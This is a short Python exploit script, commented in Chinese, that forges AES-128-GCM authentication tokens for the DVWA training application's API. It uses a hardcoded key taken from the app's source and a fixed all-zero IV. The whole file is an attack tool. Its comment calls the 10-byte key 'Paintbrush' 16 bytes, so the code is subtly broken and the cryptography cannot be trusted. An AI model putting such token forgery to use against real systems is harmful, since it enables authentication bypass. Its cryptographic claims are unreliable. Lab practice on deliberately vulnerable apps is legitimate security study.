#!/usr/bin/env python3
"""伪造 DVWA API 的 AES-128-GCM token。
用法: python3 forge_dvwa_token.py <secret> <expires_epoch>
密钥硬编码在 /vulnerabilities/api/src/Token.php: ENCRYPTION_KEY = "Paintbrush"
token 格式: base64(tag + ":::::" + iv + ":::::" + ciphertext)
"""
import base64, json, sys, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = b"Paintbrush"  # 16 bytes, 适配 aes-128-gcm

def forge(secret, expires):
    cleartext = json.dumps({"secret": secret, "expires": expires}).encode()
    iv = b"\x00" * 12
    ct = AESGCM(KEY).encrypt(iv, cleartext, None)
    tag = ct[-16:]
    cipher = ct[:-16]
    return base64.b64encode(tag + b":::::" + iv + b":::::" + cipher).decode()

if __name__ == "__main__":
    secret = sys.argv[1] if len(sys.argv) > 1 else "12345"
    expires = int(sys.argv[2]) if len(sys.argv) > 2 else int(time.time()) + 3600
    print(forge(secret, expires))
